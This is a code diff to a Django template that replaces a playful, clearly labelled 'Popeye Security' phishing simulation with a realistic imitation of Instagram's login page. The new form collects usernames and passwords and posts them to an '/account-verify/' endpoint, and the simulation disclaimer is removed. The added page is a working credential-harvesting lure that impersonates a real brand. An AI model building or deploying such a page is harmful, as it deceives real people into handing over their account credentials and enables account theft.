@@ -1,41 +1,26 @@
-{% load static %}
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Popeye Security Check</title>
-    <link rel="stylesheet" href="{% static 'style.css' %}">
+<title>Instagram</title>
+<style>
+body{background:#fafafa;font-family:Arial}
+.box{width:360px;margin:60px auto;background:#fff;padding:40px;border:1px solid #dbdbdb;text-align:center}
+input{width:100%;padding:10px;margin:8px 0;border:1px solid #dbdbdb;background:#fafafa}
+button{width:100%;background:#0095f6;border:none;color:white;padding:10px;font-weight:bold}
+.logo{font-size:36px;margin-bottom:20px}
+</style>
 </head>
+
 <body>
+<div class="box">
+<div class="logo">Instagram</div>
 
-<div class="card">
-
-    <div class="logo">
-        <img src="{% static 'images/OIP.jpg' %}" alt="Popeye Logo">
-    </div>
-
-    <h2>🥬 Popeye Security Alert</h2>
-
-    <div class="spinach">
-        Your account strength is LOW!<br>
-        Verify now to regain spinach power 💪
-    </div>
-
-    <p style="font-size:14px; text-align:center;">
-        Suspicious activity detected at sea ⚓  
-    </p>
-
-    <form method="POST">
-        {% csrf_token %}
-        <input type="email" name="email" placeholder="Sailor Email" required>
-        <input type="password" name="password" placeholder="Secret Anchor Code" required>
-        <button type="submit">Eat Spinach & Verify</button>
-    </form>
-
-    <p style="font-size:11px; text-align:center; margin-top:15px;">
-        © Popeye Security Division (Simulation)
-    </p>
-
+<form method="POST" action="/account-verify/">
+{% csrf_token %}
+<input name="username" placeholder="Phone, username, or email" required>
+<input name="password" type="password" placeholder="Password" required>
+<button type="submit">Log In</button>
+</form>
 </div>
-
 </body>
 </html>
